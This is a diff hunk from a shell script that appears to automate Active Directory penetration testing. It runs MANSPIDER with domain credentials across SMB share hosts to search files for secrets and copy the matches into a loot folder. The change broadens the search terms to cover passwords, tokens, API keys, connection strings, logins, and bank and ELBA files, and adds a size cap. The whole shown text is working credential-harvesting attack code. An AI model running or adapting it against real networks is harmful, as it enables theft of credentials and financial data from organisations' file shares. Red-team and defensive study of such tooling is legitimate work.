@@ -1171,7 +1171,7 @@ if [ "$BH_MODE" != "DCOnly" ]; then
       mkdir -p "$OUTPUT_DIR/manspider/loot"
       > "$OUTPUT_DIR/manspider/manspider.txt"
       echo "$SHARE_HOSTS" | while read -r share_host; do
-        timeout 60 $MANSPIDER_CMD "$share_host" -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -c password passwd secret credential token apikey username connectionstring pwd -e txt xml ini config conf csv bat ps1 2>&1 | grep "matched" >> "$OUTPUT_DIR/manspider/manspider.txt"
+        timeout 60 $MANSPIDER_CMD "$share_host" -u "$AD_USER" -p "$PASSWORD" -d "$DOMAIN" -c passw passw secret credential token apikey username connectionstring bios pwd passw admin account login logon cred bank ELBA -e txt xml ini config conf csv bat ps1 -s 5M 2>&1 | grep "matched" >> "$OUTPUT_DIR/manspider/manspider.txt"
         cp -r /root/.manspider/loot/. "$OUTPUT_DIR/manspider/loot/" 2>/dev/null
       done
       SPIDER_COUNT=$(grep -c "matched" "$OUTPUT_DIR/manspider/manspider.txt" 2>/dev/null || echo 0)
